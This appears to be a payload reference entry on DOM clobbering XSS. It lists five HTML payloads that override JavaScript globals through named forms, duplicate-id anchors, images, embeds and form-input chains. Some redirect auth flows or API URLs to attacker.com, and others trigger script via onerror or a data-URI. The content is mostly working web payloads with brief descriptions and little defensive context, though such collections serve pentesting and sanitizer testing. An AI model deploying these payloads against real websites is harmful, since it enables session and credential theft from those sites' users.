---
id: "xss-dom_clobbering-payloads"
title: "XSS Payloads - DOM Clobbering Payloads"
type: "payload"
category: "web-application"
subcategory: "xss"
tags: ["xss", "dom_clobbering", "payload"]
difficulty: "intermediate"
platforms: ["linux", "macos", "windows"]
related: ["xss-techniques"]
updated: "2026-03-30"
---

## Overview

Override JavaScript variables via HTML elements — bypass sanitizers that allow id/name attributes

## Payloads

### Form Name Clobbering

Overwrite window.config via named form element — redirect auth flows

- **Contexts**: html
- **Severity**: high

```html
<form name="authConfig" data-next="https://attacker.com/" data-append="true"></form>
```

### Anchor Double-ID HTMLCollection

Two anchors with same ID create HTMLCollection — .name resolves to href payload

- **Contexts**: html
- **Severity**: high

```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```

### Image Name Clobbering

Override global variable with image element — src becomes the value

- **Contexts**: html
- **Severity**: medium

```html
<img name=currentUser src=attacker-controlled-value>
```

### Embed toString Clobbering

Embed element's toString returns src — clobber variables used in string context

- **Contexts**: html
- **Severity**: high

```html
<embed name=injectable src="data:text/html,<script>alert(1)</script>">
```

### Form + Input Chain Clobbering

Access nested properties: window.form.property via form > input[name=property]

- **Contexts**: html
- **Severity**: high

```html
<form id=config><input name=apiUrl value=https://attacker.com/api><input name=debug value=true></form>
```
